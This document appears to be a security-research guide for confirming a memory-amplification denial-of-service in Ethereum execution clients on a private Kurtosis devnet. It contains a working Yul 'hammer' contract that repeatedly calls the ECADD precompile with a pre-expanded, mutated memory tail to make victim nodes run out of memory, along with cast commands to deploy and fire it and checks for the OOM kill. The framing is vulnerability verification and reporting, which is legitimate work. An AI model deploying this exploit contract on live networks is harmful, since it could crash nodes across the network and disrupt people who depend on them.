# Kurtosis harness for confirming an amplification finding

Post-`fp-check` verification runs an actual block through a real
multi-EL devnet. The harness below is derived from a working
reproduction of the ECADD OOM; adapt the prefix + suffix offsets for
a different precompile or opcode.

## Topology

Three participants, one bridge network:

| Role | EL | CL | Purpose |
|---|---|---|---|
| Proposer | **Non-victim** EL (e.g. geth) | Lighthouse (validating) | Produces blocks from its public RPC mempool |
| Victim #1 | Victim EL | Teku (validating) | Receives attack block via CL gossip → engine_newPayloadV4 |
| Victim #2 (bystander) | Victim EL | Lighthouse (`validator_count: 0`) | Pure importer, no RPC traffic from attacker, proves broadcast-range propagation |

Why two victims: the bystander eliminates the "attacker targeted us
via RPC" counter-argument. The only way block 98 reaches nm-byst is
the CL P2P layer. If it still OOMs, the attack is network-wide.

## YAML (minus `nat_exit_ip`)

```yaml
participants:
  - el_type: geth
    el_image: ethereum/client-go:<pinned-tag>
    cl_type: lighthouse
    count: 1

  - el_type: <victim>   # nethermind | besu
    el_image: <victim-image>:<pinned-tag>
    cl_type: teku
    count: 1

  - el_type: <victim>
    el_image: <victim-image>:<pinned-tag>
    cl_type: lighthouse
    validator_count: 0
    count: 1

network_params:
  preset: minimal
  genesis_delay: 20
  genesis_gaslimit: 45000000   # match mainnet
  gas_limit: 45000000
  capella_fork_epoch: 0
  deneb_fork_epoch: 0
  electra_fork_epoch: 0
  fulu_fork_epoch: 18446744073709551615

wait_for_finalization: false
global_log_level: info

# DO NOT set port_publisher.nat_exit_ip. Kurtosis will bake 127.0.0.1
# into each CL's advertised ENR, which breaks inter-container peering
# (ENR self-dial). See `kurtosis-devnet` skill's peering-debug
# reference. Unset lets each CL advertise its Docker-bridge IP; host
# access still works via DNAT-published ports.
port_publisher:
  el:
    enabled: true
    public_port_start: 33000
```

Pin `github.com/ethpandaops/ethereum-package@6.0.0` (unpinned pulls
HEAD and may fail Teku startup on EIP-7928 fork-version fields).

## Hammer contract

Foundry-compilable Yul skeleton. The constants that change per
candidate are at the top.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Amplifier {
    // Adjust per candidate:
    //   PRECOMPILE_ADDR — 0x06 (ECADD), 0x07 (ECMUL), 0x01 (ECRECOVER), etc.
    //   PREFIX_LEN      — bytes the precompile actually reads
    //                     (128 for ECADD/ECRecover, 96 for ECMUL)
    //   GAS_PER_CALL    — low enough to force many calls
    //   OUT_LEN         — precompile output length
    function hammer(uint256 iters, uint256 size, uint256 seed) external view {
        assembly {
            if lt(size, 0xa0) { revert(0, 0) }

            let ptr := mload(0x40)
            // --- valid prefix for the target precompile ---
            // ECADD (0x06): (1,2)+(1,2) = G1 point doubled
            mstore(ptr, 1)
            mstore(add(ptr, 0x20), 2)
            mstore(add(ptr, 0x40), 1)
            mstore(add(ptr, 0x60), 2)
            // --- expand memory to `size` and advance free ptr ---
            let end := add(ptr, size)
            mstore(sub(end, 0x20), seed)
            mstore(0x40, and(add(end, 0x1f), not(0x1f)))
            // --- loop: mutate one word INSIDE the ignored tail ---
            for { let i := 0 } lt(i, iters) { i := add(i, 1) } {
                mstore(add(ptr, 0x80), xor(seed, i))   // offset 0x80 = PREFIX_LEN for ECADD
                pop(staticcall(500, 0x06, ptr, size, 0, 0x40))
            }
        }
    }
}
```

Two critical invariants:

1. **The word mutated on every iteration must be inside the ignored
   tail**, not inside the precompile's read window. If you mutate
   bytes the precompile reads, the result changes, the semantic
   attack breaks, and you're just measuring uncached precompile
   performance.
2. **Memory is pre-expanded before the loop.** `mstore(sub(end,
   0x20), seed)` touches the farthest offset, paying the full
   quadratic expansion cost once. Subsequent loop iterations reuse
   the already-paid memory region at zero marginal per-byte cost.

## Driver script

Don't use Engine-API manual injection unless the CL P2P is broken;
natural mempool flow is more realistic and exercises the import path
all three victims share. Minimum driver:

1. Wait for all three EL RPCs (`eth_chainId`).
2. `forge build` Amplifier.
3. `cast send --rpc-url http://proposer:port --create <bytecode>`
   with an explicit `--nonce 0`. Wait for receipt.
4. `cast send --rpc-url http://proposer:port --nonce 1 --gas-limit
   <budget> <amplifier_addr> "hammer(uint256,uint256,uint256)" <iters>
   <size> <seed1>`. Repeat for `--nonce 2` with `<seed2>`.
5. Poll `docker inspect <victim> --format '{{.State.Status}}
   {{.State.OOMKilled}} {{.State.ExitCode}}'` once per second for 5
   minutes.

A parallel memwatch makes root-causing the amplification trivial:

```bash
pid=$(docker inspect -f '{{.State.Pid}}' <victim-container>)
while kill -0 "$pid" 2>/dev/null; do
    rss=$(awk '/^VmRSS/ {print $2, $3}' /proc/$pid/status 2>/dev/null)
    echo "$(date +%H:%M:%S) $rss"
    sleep 1
done
```

## Oracle

**Primary:** `State.OOMKilled == true && State.ExitCode == 137`.

**Secondary (to show operator blindness):** scrape the victim's
Prometheus (`http://<victim>:<metrics_port>/metrics`) during the
attack and save the `*_memory_used_by_cache` family gauges. If they
stay flat while RSS doubles, that's an independent finding for the
report ("operators' dashboards do not show this growing").

**Tertiary (dmesg):**
```
journalctl --since '5 minutes ago' | grep -iE 'oom|killed process|<victim-container>'
```

should produce lines with `anon-rss:<very large>kB` and
`constraint=<CONSTRAINT_NONE|cgroup>`.

## When the PoC doesn't fire (triage checklist)

1. **Victim and proposer on different forks** — check `eth_blockNumber`
   and `eth_getBlockByNumber("latest")["hash"]` across all three ELs.
   Different hashes at the same height means CL peering broke (see the
   `kurtosis-devnet` skill's peering-debug reference; almost always
   `nat_exit_ip` is set).
2. **Attack block was built by the victim** (proposer was the victim,
   not the opposite client) — check the block's `extraData`. If it
   matches the victim's client string, the proposer-schedule put a
   victim slot first. Wait for the next slot or re-deploy with more
   validators on the proposer side.
3. **Hammer tx silently dropped from mempool** — check
   `txpool_status` on the proposer; if `pending:0, queued:0` and the
   tx is not in a block yet, the builder may have rejected it. Lower
   the `--gas-limit`, raise `--priority-gas-price`.
4. **Victim processes it cleanly** — the allocation may be short-lived
   (per-call freed), which is what `fp-check` was supposed to catch
   but missed. Archive the finding back through `fp-check` with the
   new evidence.
5. **Cache is cleared mid-tx by some hook** — unlikely but possible.
   Check `PreBlockCaches.ClearCaches` equivalent in the target
   client; confirm it is not called during per-tx processing.

## Teardown

```bash
kurtosis enclave rm -f <enclave-name>
```

Every Kurtosis-based PoC leaves ~4 GB of container state and
interface IPs until torn down. Clean up after yourself before
starting the next candidate.
